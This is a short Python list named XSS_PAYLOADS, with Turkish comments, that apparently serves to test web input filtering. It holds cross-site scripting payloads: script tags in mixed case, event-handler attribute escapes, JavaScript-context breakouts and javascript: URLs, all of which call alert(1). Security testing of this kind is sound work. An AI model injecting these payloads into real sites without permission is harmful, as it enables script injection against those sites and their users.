# XSS Payload Listesi
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<ScRiPt>alert(1)</sCrIpT>",

    # Attribute kaçışları
    '<img src=x onerror=alert(1)>',
    'x" onmouseover="alert(1)"',
    "x' onerror='alert(1)'",
    '"><svg onload=alert(1)>',

    # JS context çıkışları
    "'); alert(1)//",
    "'); alert(1); var x='",

    # JS blok kapatma
    "'</script><script>alert(1)</script>",

    # javascript: protokolü
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",

    # HTML escape bypass
    '"><input autofocus onfocus=alert(1)>',
]
